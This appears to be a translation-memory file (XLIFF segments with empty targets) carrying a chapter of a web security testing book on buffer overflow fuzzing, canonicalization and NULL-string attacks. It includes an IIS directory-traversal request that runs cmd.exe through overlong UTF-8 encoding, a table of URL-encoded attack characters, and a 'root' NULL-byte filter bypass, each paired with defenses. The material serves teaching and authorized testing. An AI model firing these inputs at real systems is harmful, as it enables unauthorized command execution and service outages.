          <source>&lt;sup&gt;&lt;a name="ch06fn01"&gt;[1]&lt;/a&gt;&lt;/sup&gt; Immune is perhaps too strong a word here, making the reader assume that buffer overflows are impossible to achieve in Web application software, which is completely untrue. Buffer overflows are much harder to find and exploit in current Web software, but they do exist. However, the environment and languages that are used to write today's Web applications protect against attack. If a buffer overflow does exist, it generally will be in a vendor's code (that is, Microsoft's, Sun's, or PHP's) rather than your own. Therefore, the best protection measure is to ensure that you are running the most current versions of the Web server and application environment.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If in doubt, give this attack a try. It's better to be safe than sorry.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Of all the attacks we will present in this book, the buffer overflow attack is probably the easiest to conduct. The idea is to fill every input field with as much data as it will take, and then some! Look for parameters or form fields and fill them with lots of data. And when we say lots, we mean lots. It's not unusual for a buffer overflow to be uncovered only when more than 100,000 characters of data have been passed to it.&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch06fn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch06fn02"&gt;[2]&lt;/a&gt;&lt;/sup&gt; See &lt;a class="docLink" target="_blank" href="http://www.securityfocus.com/archive/1/317142/2003-03-28/2003-04-03/0"&gt;http://www.securityfocus.com/archive/1/317142/2003-03-28/2003-04-03/0&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Some of the best places to look are where the developers have restricted the length or types of input that a user can enter, discussed in &amp;quot;Attack 4&amp;mdash;Bypass Restrictions on Input Choices.&amp;quot; Form fields with the &lt;tt&gt;MAXLENGTH&lt;/tt&gt; attribute are a good hint because the developer knows he doesn't want too much data in that instance, but any field or parameter can be just as good a choice. Because a malicious user can easily remove the &lt;tt&gt;MAXLENGTH&lt;/tt&gt; restriction, it is fair game for this attack, and client-side prevention is not enough.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>How does one know when a buffer overflow attack has been successful? Well, the dangerous part of testing for this attack is that if successful, it often brings down the Web server. So be warned!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If the Web server is brought down, during subsequent request for pages, you'll likely get an error message saying that the server is unavailable. Overwriting the return address of a function to that of an unknown location produces an exception in the Web server which, if not handled, unceremoniously kills the server or program and in extreme cases the operating system, too. Therefore, you should schedule testing for buffer overflows at a time when you can tolerate disruption of service.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Proceed with extreme caution when applying this attack to a production system!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Another way of testing for buffer overflows is to generate code that won't crash the server but will produce a clear signal that the attack was successful, like a pop-up message box or a signal network packet sent to another machine. However, crafting exploit code is a highly technical skill, subject to various caveats and workarounds for different situations, and clearly out of scope for this book. If this interests you, however, &lt;span class="docEmphasis"&gt;The Shellcoder's Handbook&lt;/span&gt; by Jack Koziol et al, is a good place to start.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Identifying all the potential places to enter input and creating varying ranges of data can be quite an undertaking for anything more than a trivial Web application. Using automation for this kind of testing is a good approach, because the inputs are simple to generate, and identifying successful test cases is easy.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>SPIKE Proxy is one such tool that you can use for automated buffer overflow testing of Web applications. You simply run the proxy, point the Web browser through it (as Paros does&amp;mdash;see &lt;a class="docLink" href="app03.html#app03"&gt;Appendix C&lt;/a&gt;, &amp;quot;Tools&amp;quot;), and walk over all the pages in the application that you want to test. Visiting the proxy page, SPIKE Proxy lists a number of tests to perform, as &lt;a class="docLink" href="#ch06fig01"&gt;Figure 6-1&lt;/a&gt; shows.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 6-1. SPIKE Proxy's main page after walking a site.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Spike then replays the requests made previously, fuzzing each of the parameters it discovered depending on the test selected&amp;mdash;in our case, injecting various numbers of As.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Although SPIKE Proxy takes much of the time and tediousness out of repetitive testing, there are a few things to be aware of. First, in our experience, SPIKE Proxy generates a lot of false positives, which you can see in &lt;a class="docLink" href="#ch06fig02"&gt;Figure 6-2&lt;/a&gt;. That's because SPIKE Proxy looks for limited keywords in the response from the server to identify successful tests. There are few good alternative ways of doing this; therefore, all results have to be validated by hand. This leads to another drawback: SPIKE Proxy doesn't log the requests and responses for successful tests so that end users can easily revalidate them by hand. The best way of working around this is to redirect the output of the proxy (the &lt;tt&gt;runme.bat&lt;/tt&gt; file) to a file by using the tee utility (standard under *nix&amp;mdash;you can easily find it for Windows) and entering the following:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>c:\SPIKEProxy\runme.bat | tee &amp;ndash;a logfile.txt</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 6-2. SPIKE Proxy during automated testing.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This code sends output to both the screen and the log file. This allows you to see the SPIKE Proxy operating and how far along in its tests it is. Be aware, though; the log file can end up being &lt;span class="docEmphasis"&gt;very&lt;/span&gt; large on big sites!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Despite these complaints, SPIKE Proxy is a really useful tool. Even with the false positives, it's easy to tell if a test has been successful, because the Web server just stops responding.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>As mentioned earlier, many programming languages already have protection measures built in for this attack. In addition, so much has been written about buffer overflows, how programmers accidentally create them, and how to avoid them that many resources are available to help. We point you to Michael Howard, a guru on this topic, who has written many articles about buffer overflows in various shapes and sizes.&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch06fn03"&gt;[3]&lt;/a&gt;&lt;/sup&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch06fn03"&gt;[3]&lt;/a&gt;&lt;/sup&gt; See &lt;a class="docLink" target="_blank" href="http://blogs.msdn.com/michael_howard/"&gt;http://blogs.msdn.com/michael_howard/&lt;/a&gt; and the Code Secure columns on MSDN at &lt;a class="docLink" target="_blank" href="http://msdn.microsoft.com/security/securecode/columns/default.aspx"&gt;http://msdn.microsoft.com/security/securecode/columns/default.aspx&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Buffer overflows occur when the size of data being passed in is blindly copied into memory without checking its size. You can use two approaches to protect against this attack: knowing the size of data and allocating enough space accordingly, or terminating input at a sensible size and ignoring whatever additional data the user is trying to force upon your application.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The simplest approach is to truncate all input at a reasonable length. It's fine to truncate on the client for error locality (let the user know that the input is too large and some of it is going to be thrown away), but do it again on the server before the input is passed to memory.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 15 Canonicalization</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>By now, you've probably realized that most of the attacks we've discussed so far can be mitigated by carefully validating the input that is received. This is the nature of a lot of testing.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>However, filtering out bad input is not as easy as it sounds. In the modern world of computing, you have to deal with more than just ASCII characters. Because of the different representations available, there are various ways of encoding data, and you need to consider all of these. This is an issue known as &lt;span class="docEmphStrong"&gt;canonicalization&lt;/span&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Canonicalization means ensuring that all data is represented in a standard, common form. If we don't perform this step when comparing or using data, we may not be looking at the actual data that will eventually be processed, so any validating that we do may miss an attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The first example of canonicalization is simple encoding of characters in their HTTP/HTML equivalent. In some cases, you need to encode certain characters because they have extended meaning in some contexts. For example, if you have a space character in data that is being sent to the server (or is received by the browser), you have to encode it as &lt;tt&gt;+&lt;/tt&gt; to avoid an illegal break in the CGI parameters where spaces are not allowed. When the server or browser receives the &lt;tt&gt;+&lt;/tt&gt; character, it converts it back into a space. (An exercise for the interested reader: How are &lt;tt&gt;+&lt;/tt&gt; characters represented?)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This is a simple encoding that is carried out automatically inside the browser/server communication protocol. Unfortunately, we need to consider lots of other encoding issues, many of which occur at different levels of the communication protocol. Wherever there is a potential mismatch in the encoding and decoding of characters, an attacker could sneak data past your validation checks.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>One common representation of characters that is used on the Web is the UTF-8 representation. It translates a 31-bit character set (like UNICODE) into an 8-bit representation to reduce the number of bytes transferred between computers. Because the most common characters used are still the standard ASCII characters, UTF-8 encodes them in the most simplistic way possible. ASCII characters 0 to 127 encode themselves 0x0 to 0x7f. (The 0xNN format signifies a hexadecimal number.) All other characters require more space, so UTF-8 allows encoding as multibyte sequences in the range of 0x80 to 0x7fffffff. For a full and complete discussion of UTF-8 encoding, see &lt;a class="docLink" target="_blank" href="http://en.wikipedia.org/wiki/UTF-8"&gt;http://en.wikipedia.org/wiki/UTF-8&lt;/a&gt; and &lt;a class="docLink" target="_blank" href="http://www.unicode.org/standard/standard.html"&gt;http://www.unicode.org/standard/standard.html&lt;/a&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Now, this is where it gets interesting. When a Web server receives data, it has to decide how to decode it. With so many complicated representations, the server can sometimes get it wrong and not match what the programmer of the application was expecting to match against. In other words, the browser is working by one set of character representation rules, and the server is working on another.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The best example of this is the different representations that the &lt;tt&gt;/&lt;/tt&gt; character can be, which is also one of the characters that is used in the directory traversal attack.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The standard representation of the &lt;tt&gt;/&lt;/tt&gt; character in HTTP is the basic character itself&amp;mdash;the &lt;tt&gt;'&lt;/tt&gt; character doesn't have &amp;quot;extra&amp;quot; meaning in another context. However, it can also be represented as &lt;tt&gt;%5c&lt;/tt&gt;, which is the UTF-8 encoding of the character. (In ASCII, the value is &lt;tt&gt;0x5c&lt;/tt&gt;, so no extra conversion is required.) Most characters in UNICODE have multiple encodings, though, that could be used but shouldn't be because they are not the shortest possible. In our example of an overly long encoding, this would be &lt;tt&gt;%c0%af&lt;/tt&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>So now we have three potential encodings for a single character: &lt;tt&gt;/&lt;/tt&gt;, &lt;tt&gt;%5c&lt;/tt&gt;, and &lt;tt&gt;%c0%af&lt;/tt&gt;. It was this illegal representation of &lt;tt&gt;/&lt;/tt&gt; that was used against an IIS 4 or 5 Web server with the following request:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>http://www.example.com/app/..%c0%af..%c0%af../winnt/
 system32/cmd.exe?/c+dir</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>With this request the attacker was able to get the server's operating system to performed a &lt;tt&gt;dir&lt;/tt&gt; command (&lt;tt&gt;cmd.exe /c dir&lt;/tt&gt;), but it could have been a lot worse!</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Microsoft attempted to patch this flaw by filtering for these characters. One would have thought that this would have been the end of the story, but resourceful attackers took a further step. Given an encoded character representation (&lt;tt&gt;%5c&lt;/tt&gt;), you can encode it again. Let's pick the &lt;tt&gt;%&lt;/tt&gt; character, encode it, and then add it back into the encoded representation of &lt;tt&gt;/&lt;/tt&gt; (see &lt;a class="docLink" href="#ch06fig03"&gt;Figure 6-3&lt;/a&gt;).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 6-3. Double URL encoding.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>When the Web server picked up the request, it knew it could do several things. It could be one of the higher (that is, non-ASCII) UTF-8 encoded characters, or it could decode the &lt;tt&gt;%25&lt;/tt&gt;, find out that it's a &lt;tt&gt;%&lt;/tt&gt; character, and then decode the &lt;tt&gt;%5c&lt;/tt&gt;. It should have been the former, but due to a shift-reduce parsing error in the decoding engine, it preferred the latter, which was the opposite of the application code. Once again, the vulnerability manifested itself.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This attack is secondary to the majority of others listed in this book. Whenever you try an attack and it fails, the application may indicate that it is catching the input and validating it (error messages are produced). It is worth trying to circumvent the validation routine(s) while attempting to encode parts of the input.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In any attack, certain characters give it a signature that is different from normal data. For example, in cross-site scripting (XSS) attacks, it may be the &lt;tt&gt;&amp;lt;&lt;/tt&gt; and &lt;tt&gt;&amp;gt;&lt;/tt&gt; characters. In SQL injection, it could be the single quote or double dash (&lt;tt&gt;--&lt;/tt&gt;), although looking for these as an indication of attack is asking for trouble. Picking these characters and encoding them may result in the Web server and application performing different decoding and allowing the attack through.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>A cheat sheet of the most common characters used in attacks and their different representations is shown in &lt;a class="docLink" href="#ch06tab01"&gt;Table 6-1&lt;/a&gt;, but when there is a lot of data to encode, it's easier to use a tool.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.caption.h5.text">
          <source>Table 6.1. Common Characters Used in Attacks</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.thead.tr.th.p.text">
          <source>Character</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.thead.tr.th.p.text">
          <source>Used In</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.thead.tr.th.p.text">
          <source>URL Encoded&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch06fn04"&gt;[4]&lt;/a&gt;&lt;/sup&gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>&amp;lt; and &amp;gt;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>XSS</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>%3c and %3e</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>XSS&amp;mdash;adding javascript: to existing tags</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>%3a</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>'</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>SQL injection</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>%27</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>--</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>SQL injection</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>%2D%2D</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>;</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>SQL and command injection</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>%3B</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>../</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Directory traversal</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>%2E%2E%2F</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>`</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>Command injection</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>%60</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>/0 (null)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>NULL strings</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.p.text">
          <source>%00</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch06fn04"&gt;[4]&lt;/a&gt;&lt;/sup&gt; HTML encoding (in hex) has the same code as URL encoding, but it follows the format &lt;tt&gt;&amp;amp;#xNN&lt;/tt&gt;. For example, &lt;tt&gt;&amp;lt;&lt;/tt&gt; would be represented as &lt;tt&gt;&amp;amp;#3c;&lt;/tt&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Napkin (see &lt;a class="docLink" href="#ch06fig04"&gt;Figure 6-4&lt;/a&gt;; Napkin is available at &lt;a class="docLink" target="_blank" href="http://www.0x90.org/releases/napkin/"&gt;http://www.0x90.org/releases/napkin/&lt;/a&gt;), is a simple encoder/decoder and hex display of whatever data you pass it. Currently it handles various types of conversions: Base64, URL (UTF), ROT (rotate), MD5 checksums, and SHA checksums. It currently &lt;span class="docEmphasis"&gt;does not&lt;/span&gt; perform double decode. You simply copy the output back into the input pane and run the encode/decode again.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.center.h5.text">
          <source>Figure 6-4. Napkin&amp;mdash;An encoding/decoding tool.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.div.a.text">
          <source>[View full size image]</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>&lt;a class="docLink" href="#ch06tab01"&gt;Table 6-1&lt;/a&gt; shows a quick cheat sheet for common characters that are used in Web application attacks.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Exploits using this attack occur when the Web server treats input differently from the application. These kinds of errors are discovered and fixed frequently, so keeping a Web server patched and up to date is a good first step. After that, unfortunately, we come back to the same old recommendations of validating input. With canonicalization, though, we may have to go through an extra step depending on the encoding that has been done before it has reached the application.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>For example, with PHP versions 4 and above, you can automatically prefix all single quotes, double quotes, backslashes, and NULL characters with a backslash to help mitigate attacks like SQL injection and NULL characters. (We'll get to this attack next.)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Therefore, to do any like-to-like comparisons, the programmer has to call &lt;span class="docEmphStrong"&gt;stripslashes&lt;/span&gt; first. Similarly, in a comparison between data passed through the URL and strings on the server, the programmer may have to call urldecode. However, calling urldecode is dangerous on parameters</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>because the Web server should have already decoded it by the time it reaches the application. Calling urldecode again opens the application to the double-decode attack discussed earlier. The key is understanding what the browser and the Web server encode and decode before it reaches the application and then treating it accordingly.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.h4.text">
          <source>Attack 16 NULL-String Attacks</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>It's rare for any program to exist in isolation. Pretty much all software relies on other software to help it perform its tasks. From compilers to libraries and even microprocessor code, data filters its way down through various levels of application software, libraries, and the operating system.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>However, these different layers often treat data differently. The languages used to write Web applications are usually high-level languages like ASP, PHP, and Java, but they lean on support from libraries of prewritten code, often in lower-level languages like C and C++. Just like in our canonicalization attack, we can encode characters that have different meaning in different environments. The character in question for this attack is the NULL character, which can be represented as either &lt;tt&gt;\0&lt;/tt&gt; or &lt;tt&gt;%00&lt;/tt&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>In low-level languages like C, the NULL character signifies the end of a string, whereas in higher-level languages like PHP, its use is unnecessary because all end-of-string syntax is handled automatically.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If we have two different ways of handling the same character, we can start to see cracks in data validation mechanisms. For example, say that we are filtering for XSS by looking for &lt;tt&gt;&amp;lt;script&amp;gt;&lt;/tt&gt; tags, and we know that to actually do the string comparison, our higher-level language uses library functions that are written in a lower-level language. By passing &lt;tt&gt;&amp;lt;%00string&amp;gt;&lt;/tt&gt;, we can fool the library function into not matching the malicious string, because as far as it's concerned, the string ended after the &lt;tt&gt;&amp;lt;&lt;/tt&gt; character. The higher-level language, however, sees the NULL character as nothing, parses it from the data, and writes &lt;tt&gt;&amp;lt;script&amp;gt;&lt;/tt&gt; to the browser.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>When to Apply This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>Let's use a simple example to demonstrate the point and to give a nod to one of the pioneers of Web application security testing, RainForrestPuppy,&lt;sup class="docFootnote"&gt;&lt;a class="docLink" href="#ch06fn05"&gt;[5]&lt;/a&gt;&lt;/sup&gt; whose example this is.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.blockquote.p.text">
          <source>&lt;sup&gt;&lt;a name="ch06fn05"&gt;[5]&lt;/a&gt;&lt;/sup&gt; You can find RFP's Web site at &lt;a class="docLink" target="_blank" href="http://www.wiretrip.net/rfp/"&gt;http://www.wiretrip.net/rfp/&lt;/a&gt; until he comes out of retirement.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>What if we had a script that allowed people to change passwords unless the user they were trying to change was &lt;tt&gt;root&lt;/tt&gt;, the administrative user? Here's the Perl code that we would be expecting to see:</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.div.pre.text">
          <source>if ($username ne "root"){
  # change the password
  # do whatever's needed in here
  #  - chpasswd, passwd, update database, etc
}
else{
  #do nothing and print error message
  die ("You cannot change the root password");
}</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>If the user tries to change the password with the username parameter equal to &lt;tt&gt;root&lt;/tt&gt;, Perl makes the match and the script exits with an error message. However, if the user tries &lt;tt&gt;root/0&lt;/tt&gt;, Perl does not match the string and executes the password change. If Perl filters that change to lower-level functions (like the change password shell command or the kernel function), the NULL is effectively dropped, leaving just &lt;tt&gt;root&lt;/tt&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>This leads to where you should look to apply this attack. The answer is quite simple. Where you have been performing other attacks (SQL injection, XSS, directory traversal, and so on), and you have been thwarted because of possible input filtering, try adding a NULL character at various places in the input, such as at the end for strings where a direct match is being looked for, or in the middle where strings are being concatenated together and you want stop filtering at a certain point.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Conduct This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>All this attack entails is putting NULL characters in strings to attempt to overcome filtering. Always try to use the clean attack first (there's no point in making things more complicated than they need to be), but if that fails and you get an error message indicating that some filtering may be going on, try adding NULL characters at different points, like the beginning or the end of the string. Remember: The NULL character can be represented in two ways: the C syntax of &lt;tt&gt;\0&lt;/tt&gt;, or the encoded variety of &lt;tt&gt;%00&lt;/tt&gt;.</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.table.tr.td.h5.text">
          <source>How to Protect Against This Attack</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>The simplest way of protecting against this type of attack is ensuring that you use the same programming language throughout the application, including any other code that it may rely on. This is much more difficult than it sounds, though. You seldom have control of all the application code unless you write it yourself, which is unreasonable. (Why go reinventing the wheel?)</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
          <source>A much simpler approach is to look for and remove NULL characters at the first opportunity you get to avoid them being misrepresented elsewhere in the application. Be aware, though, of the canonicalization issues presented earlier, and the &lt;tt&gt;&amp;lt;scr&amp;lt;script&amp;gt;ipt&amp;gt;&lt;/tt&gt; find and replace trick with double slashes (&lt;tt&gt;\\00&lt;/tt&gt;).</source>
          <target></target>
        </trans-unit>
        <trans-unit id="table.tr.td.table.tr.td.div.table.tr.td.p.text">
